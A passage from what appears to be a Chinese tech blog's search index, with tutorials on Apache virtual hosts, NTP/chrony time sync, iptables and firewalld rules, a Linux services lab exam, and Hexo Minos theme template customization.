中进行查询，然而使用Alias定义的路径将直接映射到相应目录下，而不再到DocumentRoot 下面进行查询。因此Alias可以用来映射一些公用文件的路径，例如保存了各种常用图标的icons路径。这样使得除了使用符号连接之外，文档根目录（DocumentRoot）外的目录也可以通过使用了Alias映射，提供给浏览器访问。定义好映射的路径之后，应该需要使用Directory语句设置访问限制。　　#NameVirtualHost 12.34.56.78:80　　#NameVirtualHost 12.34.56.78　　#　　# ServerAdmin webmaster@host.some_domain.com　　# DocumentRoot /www/docs/host.some_domain.com　　# ServerName host.some_domain.com　　# ErrorLog logs/host.some_domain.com-error_log　　# CustomLog logs/host.some_domain.com-access_log common　　# 这个字段是虚拟主机的相关内容，虚拟主机是在一台Web服务器上，可以为多个单独域名提供Web服务，并且每个域名都完全独立，包括具有完全独立的文档目录结构及设置，这样域名之间完全独立，不但使用每个域名访问到的内容完全独立，并且使用另一个域名无法访问其他域名提供的网页内容。","link":"/2016/12/23/booboo_easy_service/05_apache/"},{"title":"时间同步服务NTP和Chony","text":"服务 域名解析服务 文件共享服务 web服务 DNS FTP NFS SAMBA APACHE 软件 bind bind-chroot vsftpd rpcbind nfs-utils samba samba-common httpd 服务 named vsftpd rpcbind nfs smb nmb httpd daemon named vsftpd rpcbind nfs smbd nmbd httpd 端口号 53 21 111 2049 137 138 139 445 80 8080 配置文件 /etc/named.conf /etc/named.rfc1912.zones /etc/vsftpd/vsftpd.conf /etc/exports /etc/samba/smb.conf /etc/httpd/conf/httpd.conf 数据文件 /var/named/ /var/ftp/ /var/lib/samba /var/www 客户端 lftp rpcbind samba-client elinks 命令 nslookup lftp nfs-utils mount smbclient links Ntp服务的作用大家设想一下，如果我们的主机时间不准，可以怎么做？有将硬件时间和软件时间同步的办法，也可以使用date -s去设置一个时间，但是你怎么知道你设置的时间就一定准了，或者说你能确定硬件时间一定准么？不能保证吧？那这时候我们就可以找天文台或者一些网络上的时间服务器去做同步，那这时候怎么去做呢？ 这里就用到一种服务了，这种服务叫做ntp服务，它是一种针对时间同步的服务。 Ntp服务的原理其实更细化来说，NTP服务器（Network Time Protocol）是用来使计算机时间同步化的一种协议，它可以使计算机对其服务器或时钟源（如石英钟，GPS等等)做同步化，它可以提供高精准度的时间校正（LAN上与标准间差小于1毫秒，WAN上几十毫秒），且可介由加密确认的方式来防止恶毒的协议攻击。时间按NTP服务器的等级传播。按照离外部UTC源的远近把所有服务器归入不同的Stratum（层）中。 Stratum层也是一个分层式的结构，下一层找上一层做同步，上一层还有上一层。以此类推。 时间同步服务配置服务端 rhel6 rhel7 软件 ntp chrony service ntpd chronyd daemon ntpd chronyd 配置文件 /etc/ntp.conf /etc/chrony.conf 数据文件 /var/lib/ntp /var/lib/chrony 日志文件 /var/log/ntpstats /var/log/chrony 客户端 命令 ntpdate timedatectl ntpdate 172.25.0.11 timedatectl set-ntp 1 项目实践1：配置ntp时间同步服务器rhel6 软件 ntp-4.2.6p5-1.el6.x86_64 配置详解NTP安全设置(restrict) 运行一个NTP Server不需要占用很多的系统资源,所以也不用专门配置独立的服务器,就可以给许多client提供时间同步服务, 但是一些基本的安全设置还是很有必要的那么这里一个很简单的思路就是第一我们只允许局域网内一部分的用户连接到我们的服务器. 第二个就是这些client不能修改我们服务器上的时间 driftfile /var/lib/ntp/drift #侦测BIOS时钟与Linux系统时间的差异写入次文件。 利用restrict 来管理权限控制 Restrict [IP] mask [netmask_IP] [parameter] Parameter 的参数主要如下： ignore :拒绝所有类型的NTP联机。 nomodify: 客户端不能使用ntpc 与ntpq 这两个程序来修改服务器的时间参数，但客户端可透过这部主机来进行网络校时； noquery:客户端不能够使用ntpc 与ntpq 等指令来查询时间服务器，不提供NTP的网络校时。 notrap:不提供trap 这个运程事件登入的功能。 notrust:拒绝没有认证的客户端。 Kod:kod技术可以阻止“Kiss of Death “包对服务器的破坏。拒绝服务攻击 Nopeer:不与其他同一层的NTP服务器进行时间同步。 利用server 设定上层NTP服务器，格式如下： server [IP or hostname] [prefer] perfer:表示优先级最高 burst ：当一个运程NTP服务器可用时，向它发送一系列的并发包进行检测。 iburst ：当一个运程NTP服务器不可用时，向它发送一系列的并发包进行检测。 注：默认情况小15分钟后才会与上层NTP服务器进行时间校对。 谁能来同步我的时间？ 首先我们对于默认的client拒绝所有的操作 代码:restrict default kod nomodify notrap nopeer noquery 然后允许本机地址一切的操作 代码:restrict 127.0.0.1 最后我们允许局域网内所有client连接到这台服务器同步时间.但是拒绝让他们修改服务器上的时间 代码:restrict 172.25.0.0 mask 255.255.255.0 nomodify 我去同步谁的时间？ server 时间同步服务器 层数比我高的，及数字比我小的 代码:12server 127.127.1.0 # local clockfudge 127.127.1.0 stratum 10 ####　详细步骤 123456789101112131415161718192021222324252627282930313233343536# 服务器端[root@rhel6 ~]# yum install -y ntp[root@rhel6 ~]# vim /etc/ntp.conf[root@rhel6 ~]# grep -v &quot;^#&quot; /etc/ntp.conf|grep -v &quot;^$&quot;driftfile /var/lib/ntp/driftrestrict default kod nomodify notrap nopeer noqueryrestrict -6 default kod nomodify notrap nopeer noqueryrestrict 127.0.0.1restrict -6 ::1restrict 172.25.0.0 mask 255.255.255.0 nomodifyserver 172.25.0.11server 127.127.1.0 fudge 127.127.1.0 stratum 10includefile /etc/ntp/crypto/pwkeys /etc/ntp/keys[root@rhel6 ~]# service ntpd startStarting ntpd: [ OK ][root@rhel6 ~]# service iptables stop# 客户端[root@rhel7 ~]# which ntpdate/usr/sbin/ntpdate[root@rhel7 ~]# rpm -qf /usr/sbin/ntpdatentpdate-4.2.6p5-18.el7.x86_64[root@rhel7 ~]# systemctl stop firewalld[root@rhel7 ~]# ntpdate 172.25.0.11 2 Aug 06:36:51 ntpdate[8128]: step time server 172.25.0.11 offset -0.691491 sec[root@rhel7 ~]# date -s &quot;2016-08-01&quot;Mon Aug 1 00:00:00 EDT 2016[root@rhel7 ~]# dateMon Aug 1 00:00:01 EDT 2016[root@rhel7 ~]# ntpdate 172.25.0.11 2 Aug 06:37:35 ntpdate[8140]: step time server 172.25.0.11 offset 110240.425235 sec[root@rhel7 ~]# dateTue Aug 2 06:37:37 EDT 2016 一些补充和拾遗（挺重要） 配置文件中的driftfile是什么?我们每一个system clock的频率都有小小的误差,这个就是为什么机器运行一段时间后会不精确.NTP会自动来监测我们时钟的误差值并予以调整.但问题是这是一个冗长的过程,所以它会把记录下来的误差先写入driftfile.这样即使你重新开机以后之前的计算结果也就不会丢失了 如何同步硬件时钟?NTP一般只会同步system clock. 但是如果我们也要同步RTC(hwclock)的话那么只需要把下面的选项打开就可以了 代码:12# vi /etc/sysconfig/ntpdSYNC_HWCLOCK=yes 让rhel6运行ntpdate更新时间时，rhel6同步失败，会提示端口被占用：如下12[root@rhel6 ~]# ntpdate 172.25.0.11 2 Aug 18:39:16 ntpdate[4831]: the NTP socket is in use, exiting 利用crontab让rhel7 NTP定时更新时间10 8 * * * /usr/sbin/ntpdate 172.25.0.11 chronychrony-1.29.1-1.el7.x86_64 RHEL从7.0开始改用chrony同步时间，原ntp同步方式也可以使用，但要安装ntp服务。 chronyd是一个在系统后台运行的守护进程。他根据网络上其他时间服务器时间来测量本机时间的偏移量从而调整系统时钟。对于孤立系统，用户可以手动周期性的输入正确时间（通过chronyc）。在这两种情况下，chronyd决定计算机快慢的比例，并加以纠正。chronyd实现了NTP协议并且可以作为服务器或客户端。 项目实践2：配置chrony时间同步服务器123456789101112131415161718192021222324252627282930313233[root@rhel7 ~]# yum install -y chrony[root@rhel7 ~]# vim /etc/chrony.conf[root@rhel7 ~]# grep -v &quot;^#&quot; /etc/chrony.conf |grep -v &quot;^$&quot;server 172.25.0.10allow 172.25.0.0/24stratumweight 0driftfile /var/lib/chrony/driftrtcsyncmakestep 10 3bindcmdaddress 127.0.0.1bindcmdaddress ::1keyfile /etc/chrony.keyscommandkey 1generatecommandkeynoclientloglogchange 0.5logdir /var/log/chrony[root@rhel7 ~]# timedatectl Local time: Tue 2016-08-02 07:24:15 EDT Universal time: Tue 2016-08-02 11:24:15 UTC RTC time: Tue 2016-08-02 11:24:15 Timezone: America/New_York (EDT, -0400) NTP enabled: yesNTP synchronized: yes RTC in local TZ: no DST active: yes Last DST change: DST began at Sun 2016-03-13 01:59:59 EST Sun 2016-03-13 03:00:00 EDT Next DST change: DST ends (the clock jumps one hour backwards) at Sun 2016-11-06 01:59:59 EDT Sun 2016-11-06 01:00:00 EST 项目汇总","link":"/2016/12/23/booboo_easy_service/06_ntp_chrony/"},{"title":"防火墙 iptables","text":"防火墙的作用防火墙是一个组件，工作在网络边缘（主机边缘），对进出网络数据包基于一定的规则检查，并在匹配某规则时由规则定义的处理进行处理的一组功能的组件。 防火墙类型根据工作的层次的不同来划分，常见的防火墙工作在OSI第三层，即网络层防火墙，工作在OSI第七层的称为应用层防火墙，或者代理服务器（代理网关）。 网络层防火墙又称包过滤防火墙，在网络层对数据包进行选择，选择的依据是系统内设置的过滤逻辑，通过检查数据流中每个数据的源地址，目的地址，所用端口号和协议状态等因素来确定是否允许该数据包的通过，以及数据包的流向等。 还可以分为硬件防火墙和软件防火墙 软件防火墙 EL6上的防火墙叫做iptables。 EL7上的防火墙叫做firewalld。 iptables语法iptables -t table CMD chain rule-matcher -j target 表 动作 链 规则匹配 执行操作表table使用 -t 来指定表,如果省略,则代表对 filter 表进行操作 filter 表:用于过滤数据包 nat 表:用于修改数据包的来源和目的地 mangle 表:用户修改数据包的生存周期等等 raw 表:跟踪机制 CMD动作 A 追加 I 插入 D 删除 L 罗列 F 清空 表当中包含链chain链是用来区分数据包的流向状态 INPUT 入站的数据包 OUTPUT 出站的数据包 PREROUTING 路由判断之前的数据包 POSTROUTING 路由判断之后的数据包 FORWARD 第一次路由判断之后,到最后一词路由判断之前 规则rule是用来判断数据包的具体情况 -p 协议 -s 来源 -d 目的地 –sport 来源端口 –dport 目的端口 -i 入站网络接口 -o 出站网络接口 ! 取反 执行操作target ACCEPT 接受 DROP 丢弃 REJECT 拒绝 DNAT 目标地址转换 SNAT 源地址转换 应用实例 查看规则 iptables -L 规则清空 iptables -F 预选策略 iptables -P INPUT ACCEPT 保存策略 service iptables save or iptables-save &gt; /etc/sysconfig/iptables 开机后重新导入 iptables-restore &lt; /etc/sysconfig/iptables 只允许172.25.0.250和你自己的服务器能够访问ftp服务（rhel6） 123iptables -A INPUT -s 172.25.0.250 -p tcp --dport 21 -j ACCEPTiptables -A INPUT -s 172.25.0.11 -p tcp --dport 21 -j ACCEPTiptables -A INPUT -p tcp --dport 21 -j DROP 禁止ping包 1iptables -A INPUT -p icmp -j DROP 仅允许172.25.0.0/24网段和172.25.15.0/24网段用户能够访问我的邮件服务器 123iptables -A INPUT -s 172.25.0.0/24 -p tcp --dport 25 -j ACCEPTiptables -A INPUT -s 172.25.15.0/24 -p tcp --dport 25 -j ACCEPTiptables -A INPUT -p tcp --dport 25 -j DROP 课堂练习题目rhel6 172.25.x.11 清空规则 预设filter表INPUT是ACCEPT 仅允许172.25.254.250和172.25.254.X 能够ssh到我的服务器（rhel6 172.25.X.11）上123iptables -A INPUT -s 172.25.254.250 -p tcp --dport 22 -j ACCEPTiptables -A INPUT -s 172.25.254.16 -p tcp --dport 22 -j ACCEPTiptables -A INPUT -p tcp --dport 22 -j DROP 仅允许172.25.254.0/24和172.25.X.0/24能够ping我的服务器123iptables -A INPUT -s 172.25.254.0/24 -p icmp -j ACCEPTiptables -A INPUT -s 172.25.16.0/24 -p icmp -j ACCEPTiptables -A INPUT -p icpm -j DROP 不允许172.25.254.254访问我的邮件服务器1iptables -A INPUT -s 172.25.254.254 -p tcp --dport 25 -j DROP 保存规则123rhel6servcie iptables saveiptables-save &gt; /etc/sysconfig/iptables 查看规则1iptables -L 关机重启1iptables-restore &lt; /etc/sysconfig/iptables Firewalld的用法Firewalld是el7默认的防火墙，和iptables冲突，如果要使用其中之一，需要关闭另外一个 运行、停止、禁用firewalld: 启动：systemctl start firewalld 查看状态：systemctl status firewalld 或者 firewall-cmd --state 停止：systemctl disable firewalld 禁用：systemctl stop firewalld 可以通过 firewall-config图形化工具 来控制 firewall-cmd 命令行工具 Firewall-config Configuration runtime和permanent 分别是运行时和永久 zone 默认区域配置 Trusted：允许所有传入数据包 drop：默认丢弃所有包 block：拒绝所有外部连接，允许内部发起的连接 public：指定外部连接可以进入 external：这个不太明白，功能上和上面相同，允许指定的外部连接 dmz：和硬件防火墙一样，受限制的公共连接可以进入 work：工作区，概念和workgoup一样，也是指定的外部连接允许 home：类似家庭组 internal：信任所有连接 富规则：可用于表达基本的允许和拒绝规则。Configuration permenent 左上角：Option reloade firewallSsh就无法登陆了 firewall-cmd1firewall-cmd --permanent --zone=public --add-rich-rule=\\&apos;rule family=ipv4 service name=&quot;ssh&quot; source address=192.168.137.11 log prefix=&quot;ssh&quot; level=&quot;notice&quot; limit value=&quot;3/m&quot; reject\\&apos; 将来自于192.168.137.11的ssh拒绝掉，并且将notice以上的日志写入到ssh日志当中，限制每分钟最多三条记录。","link":"/2016/12/23/booboo_easy_service/07_iptables_firewalld/"},{"title":"Linux简易服务上机考试","text":"##　注意事项 确保在重启主机后所有配置仍然生效。 selinux必须为Enforing模式，防火墙必须开始。默认策略必须清空。 设置主机名为 stuXXX（“X”为你的 foundation 机器 ip 地址最后一位。例如：你的 ip 地址为172.25.254.30，则你的主机名为stu30） 不允许ssh登录到其他主机，已经发现按0分计算考试得分。 考试满分为100分制，70分为及格，90分为优秀，所有考题需要按照要求完成。 考试内容find查找文件使用find查找/etc目录下文件名以.conf结尾的文件，并将其复制到/tmp/etc目录下。（10分） ###　autofs自动挂载　 配置autofs，当执行cd /opt/server 时，系统自动将172.25.254.250:/content 挂载到此目录。（10分） 用户和组的管理创建test1 test2 test3用户，uid=gid分别为801 802 803，将他们加入到test组（本机无test用户），组test为这些用户的附加组。创建/tmp/test目录，该目录只有test1 test2 test3用户可读写，（root不受限制）。该目录下所创建文件group将自动改变为test组，该目录下文件只有owner可删除。（10分） Apache搭建网站服务基于名称的虚拟主机创建两个基于名称的虚拟主机网站www.test.com和www.stuXXX.com DNS域名解析服务配置相应的DNS正、反解析,网站的默认首页内容分别为 www.test.com 和www.stuXXX.com。（10分） LVM逻辑卷管理制作两个lv，/dev/vg_web/lv_test 和/dev/vg_web/lv_stu。每个逻辑卷200M。分别作为以/var/www/test.com 和 /var/www/stuXXX.com上两个虚拟主机的主目录(Document root)(10分) web页面身份认证配置页面身份认证，使www.stuXXX.com 必须通过用户名jack，密码uplooking验证才能访问。（10分） Samba文件共享服务配置samba，使user1（自己新建）用户密码为redhat，可以通过smbclient上传下载文件到自己的家目录和/samba（自己新建）目录，/samba共享名为pub。（10分 FTP文件共享服务配置vsftpd使student用户可以通过ftp上传下载文件自己家目录中的文件，同时对student用户启用chroot功能，并且允许匿名用户上传文件到/var/ftp/test目录下。（10分） 周期性计划任务对 natasha 用户配置计划任务,要求在本地时间的每天 14:23 分执行以下命令 （10分） /bin/echo “hi uplooking” iptables防火墙iptables（10分） 清空iptables filter表的默认策略（2分） 只允许172.25.0.250和你使用自己搭建的的ftp服务（2分） 禁止ping包（2分） 仅允许172.25.0.0/24网段和你自己的网段用户访问你的web服务器（2分） 保存iptables配置（2分）","link":"/2016/12/23/booboo_easy_service/ule-online/"},{"title":"企业复工期间，如何快速构建线上实时分析系统？","text":"AnalyicDBAnalyicDB 报表库经常卡顿，完全享受不到实时分析带来的便利，错失了更有价值的数据和更精准的分析成果… 没关系，改变来了！！今天下午四点，阿里云两位产品专家、经理在线教你如何在不同场景下，构建低成本实时报表分析系统～ AnalyicDB：全球最快的实时数据仓库、Quick BI:首个入选Gartner全球ABI魔力象限的中国产品 “王炸组合”会擦出什么火花呢～今天下午四点，本群直播，不见不散～ Flowerplus花加：ADB助力分尚网络提速业务Flowerplus花加：ADB助力分尚网络提速业务 日志实时分析 实时数仓","link":"/2020/04/13/booboo_hbcloud/2020-04-13-hb-cloud02/"},{"title":"Minos主题博客使用个性域名","text":"购买个性域名此步骤略，参考参考文章 添加 CNAME 文件在 Hexo 本地目录中的 source 文件夹里，添加一个命名为 CNAME 的无后缀文件，文件中的填写你的域名。 如果你想让地址栏的域名显示 www 前缀就输入 www.xxxxx.com，否则输入 xxxxx.com 即可。 开启Https然后我们在 Github Pages 项目中 Settings 选项卡 Github Pages 选项：在 Custom domain 添加你的自定义域名。 例如我配置 apex domain「tding.top」点击 save 保存 刷新页面 如果能勾选 Enforce HTTPS 即完成。","link":"/2020/04/08/booboo_hexo/2020-04-03-tec-hexo/"},{"title":"Minos主题修改筛选后的页面","text":"摘要：在模版minos的基础上，定制一些自己的前端需求。 支持Bootstrap4的css和js因为更熟悉Bootstrap的前端组件，因此第一步添加相关的css和js配置。 编辑文件minos/layout/common/head.ejs 添加以下内容 1234&lt;!-- Bootstrap CSS --&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css&quot; integrity=&quot;sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;!-- Bootstrap CSS --&gt; 编辑文件minos/layout/common/scripts.ejs添加以下内容 1234567891011&lt;!-- Bootstrap JS --&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.slim.min.js&quot; integrity=&quot;sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js&quot; integrity=&quot;sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/js/bootstrap.min.js&quot; integrity=&quot;sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/script&gt;&lt;!-- Bootstrap JS --&gt; 注意：添加js后，导致搜索框失效，如果需要搜索，可以不添加JS 筛选后的页面更改当前现状：当前的点击标签活分类时，会将所有的文章都显示出来，且不分页，导致如果文章较多时，不方便选择和查看。 我的期望：只显示文章名和发布时间，按照发布时间排序。 修改文件minos/layout/index.ejs文件： 1234567891011121314151617181920212223242526272829303132&lt;section class=&quot;section&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;% const groups = {}; const years = []; page.posts.each(post =&gt; { const year = post.date.year(); if (typeof(groups[year]) === &apos;undefined&apos;) { groups[year] = []; years.push(year); } groups[year].push(post); }); years.sort((a, b) =&gt; b - a); %&gt; &lt;% for (let year of years) { %&gt; &lt;div class=&quot;archive content&quot;&gt; &lt;h4 class=&quot;title is-4&quot; id=&quot;&lt;%= year %&gt;&quot;&gt;&lt;%= year %&gt;&lt;/h4&gt; &lt;div class=&quot;articles&quot;&gt; &lt;% for (let post of groups[year].sort((a, b) =&gt; b.date.diff(a.date))) { %&gt; &lt;div class=&quot;article content&gt;&quot;&gt; &lt;time class=&quot;is-text-small&quot; datetime=&quot;&lt;%= date_xml(post.date) %&gt;&quot; itemprop=&quot;datePublished&quot;&gt; &lt;%= format_date(post.date) %&gt;&lt;/time&gt; &lt;h6 class=&quot;title is-6&quot;&gt;&lt;a href=&quot;&lt;%= url_for(post.link ? post.link : post.path) %&gt;&quot;&gt;&lt;%= post.title %&gt;&lt;/a&gt;&lt;/h6&gt; &lt;/div&gt; &lt;% } %&gt; &lt;/div&gt; &lt;/div&gt; &lt;% } %&gt; &lt;% if (page.total &gt; 1) { %&gt; &lt;%- partial(&apos;common/paginator&apos;) %&gt; &lt;% } %&gt; &lt;/div&gt;&lt;/section&gt; 解决 目录 问题 目录中文乱码 无法链接跳转标题 带空格标题跳转问题 修改文件minos/layout/common/navbar.ejs，找到&lt;div class=&quot;navbar-dropdown is-right&quot;&gt;代码段 12345678910&lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%= heading[1] %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%= heading[2] %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt;&lt;/div&gt; 问题-目录乱码原因：目录组件输出的&amp;符号为转义符&amp;amp;。HTML的&amp;lt;,&amp;gt;,&amp;amp;,&amp;quot;,&amp;copy;分别是&lt;，&gt;，&amp;，&quot;，©的转义字符。 解决方法：将&amp;amp;替换改为&amp; 1&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt; 问题-无法链接跳转标题原因：代码中没有设置链接 解决方法： 1href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot; 问题-如果标题中含有空格则无法正常链接原因：markdown中待空格的标题会转变为符号-,因此无法正常跳转。 解决方法： 替换 %20 为 - 1&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt; 最终代码 12345678910&lt;div class=&quot;navbar-dropdown is-right&quot;&gt; &lt;% let lastHeading = null; %&gt; &lt;% for (let heading of toc_list(page.content)) { %&gt; &lt;% if (lastHeading !== null &amp;&amp; heading[0].split(&apos;.&apos;)[0] !== lastHeading) { %&gt; &lt;hr class=&quot;navbar-divider&quot;&gt; &lt;% } %&gt; &lt;% lastHeading = heading[0].split(&apos;.&apos;)[0]; %&gt; &lt;a class=&quot;navbar-item&quot; href=&quot;#&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;).replace(/ /g,&apos;-&apos;) %&gt;&quot;&gt;&lt;%= heading[0] %&gt;&amp;nbsp;&amp;nbsp;&lt;%- heading[3] === 1 ? &apos;&lt;b&gt;&apos; : &apos;&apos; %&gt;&lt;%- heading[2].replace(/&amp;amp;/g, &apos;&amp;&apos;) %&gt;&lt;%- heading[3] === 1 ? &apos;&lt;/b&gt;&apos; : &apos;&apos; %&gt;&lt;/a&gt; &lt;% } %&gt;&lt;/div&gt; 修改页面导航栏当前：居中显示与文章部分同宽 800px 我的期望： 导航1200px 文章1100px logo占1个格子 分类占10个格子 链接占1个格子 修改CSS配置minos/layout/source/css/style.css 1234567891011121314151617@media screen and (min-width: 1024px) { .container { max-width: 1100px; width: 1100px; } //新增 .navbar-container { max-width: 1200px; width: 1200px; margin-left: 10.333%; } //新增 .navbar.is-transparent .navbar-dropdown a.navbar-item:hover { color: #3273dc; }} 修改minos/layout/layout/common/navbar.ejs，添加以下代码 12345678910111213&lt;div class=&quot;navbar-container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;!--左侧只占一个格子 --&gt; &lt;/div&gt; &lt;div class=&quot;col-md-10&quot;&gt; &lt;!--中间自适应 --&gt; &lt;/div&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;!--最右侧 --&gt; &lt;/div&gt; &lt;/div&gt;&lt;/div&gt; 最终代码：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153&lt;% function is_same_link(a, b) { function santize(url) { let paths = url.replace(/(^\\w+:|^)\\/\\//, &apos;&apos;).split(&apos;#&apos;)[0].split(&apos;/&apos;); if (paths.length &gt; 0 &amp;&amp; paths[paths.length - 1].trim() === &apos;index.html&apos;) { paths = paths.slice(0, paths.length - 1) } return paths.join(&apos;/&apos;); } return santize(url_for(a)) == santize(url_for(b));} %&gt;&lt;nav class=&quot;navbar is-transparent is-fixed-top navbar-main&quot; role=&quot;navigation&quot; aria-label=&quot;main navigation&quot;&gt; &lt;div class=&quot;navbar-container&quot;&gt; &lt;div class=&quot;row&quot;&gt; &lt;!--左侧只占一个格子 --&gt; &lt;div class=&quot;col-md-1&quot;&gt; &lt;div class=&quot;navbar-brand&quot;&gt; &lt;a class=&quot;navbar-item navbar-logo&quot; href=&quot;&lt;%- url_for(&apos;/&apos; + (!is_default_language(page_language()) ? page_language() : &apos;&apos;)) %&gt;&quot;&gt; &lt;% if (has_config(&apos;logo&apos;) &amp;&amp; get_config(&apos;logo&apos;)) { %&gt; &lt;% if (has_config(&apos;logo.text&apos;) &amp;&amp; get_config(&apos;logo.text&apos;)) { %&gt; &lt;%= get_config(&apos;logo.text&apos;) %&gt; &lt;% } else { %&gt; &lt;img src=&quot;&lt;%- url_for(get_config(&apos;logo&apos;)) %&gt;&quot; alt=&quot;&quot; height=&quot;28&quot;&gt; &lt;% } %&gt; &lt;% } else { %&gt; &lt;img src=&quot;&lt;%- url_for(&apos;images/logo.png&apos;) %&gt;&quot; alt=&quot;&quot; height=&quot;28&quot;&gt; &lt;% } %&gt; &lt;/a&gt; &lt;div class=&quot;navbar-burger&quot;&gt; &lt;span&gt; &lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;span&gt;&lt;/span&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;!--中间自适应 --&gt; &lt;div class=&quot;col-md-10&quot;&gt; &lt;% if (has_config(&apos;menu&apos;)) { %&gt; &lt;div class=&quot;navbar-menu navbar-start&quot;&gt; &lt;% for (let i in get_config(&apos;menu&apos;)) { let menu = get_config(&apos;menu&apos;)[i]; %&gt; &lt;a class=&quot;navbar-item &lt;% if (typeof(page.path) !== &apos;undefined&apos; &amp;&amp; is_same_link(menu, page.path)) { %&gt;is-active&lt;% } %&gt;&quot; href=&quot;&lt;%- url_for(menu) %&gt;&quot;&gt;&lt;%= i %&gt;&lt;/a&gt; &lt;% } %&gt; &lt;!-- BoobooWei自动根据已有的category创建--&gt; &lt;% var childCategory = {}; site.categories.forEach(function (category) { if (category.parent) { if (childCategory[category.parent]) { childCategory[category.parent].push(category); } else { childCategory[category.parent] = [category]; } } }) %&gt; &lt;nav class=&quot;navbar navbar-expand-lg navbar-light&quot;&gt; &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarSupportedContent&quot; aria-controls=&quot;navbarSupportedContent&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt; &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt; &lt;/button&gt; &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarSupportedContent&quot;&gt; &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt; &lt;!--循环category 生成navbar代码--&gt; &lt;% site.categories.forEach(function(category){ %&gt; &lt;% if(!category.parent) { %&gt; &lt;li class=&quot;nav-item dropdown&quot;&gt;&lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#ff&quot; role=&quot;button&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot; id=&quot;&lt;%=category.name%&gt;&quot;&gt;&lt;% if (childCategory[category._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=category.name%&gt;&lt;/a&gt; &lt;% if (childCategory[category._id]) {%&gt; &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;&lt;%=category.name%&gt;&quot;&gt; &lt;% childCategory[category._id].forEach(function (child) { %&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;&lt;%=url_for(child.path)%&gt;&quot; data-rel=&quot;&lt;%=child.name%&gt;&quot;&gt;&lt;% if (childCategory[child._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=child.name%&gt;&lt;/a&gt; &lt;% if (childCategory[child._id]) {%&gt; &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;&lt;%=category.name%&gt;&quot;&gt; &lt;% childCategory[child._id].forEach(function (child2) { %&gt; &lt;a class=&quot;dropdown-item&quot; href=&quot;&lt;%=url_for(child2.path)%&gt;&quot; data-rel=&quot;&lt;%=child.name%&gt;&quot;&gt; data-rel=&quot;&lt;%=child2.name%&gt;&quot;&gt;&lt;% if (childCategory[child2._id]) {%&gt;&lt;i class=&quot;fold iconfont icon-right&quot;&gt;&lt;/i&gt;&lt;% } %&gt;&lt;%=child2.name%&gt;&lt;/a&gt; &lt;% }) %&gt; &lt;/div&gt; &lt;% } %&gt; &lt;% }) %&gt; &lt;/div&gt; &lt;/li&gt; &lt;% } %&gt; &lt;% } else { %&gt; &lt;% } %&gt; &lt;% }) %&gt; &lt;/ul&gt; &lt;/div&gt; &lt;/nav&gt; &lt;!-- 自动根据已有的category创建--&gt; &lt;/div&gt; &lt;% } %&gt; &lt;/div&gt; &lt;!--最右侧 --&gt; &lt;div 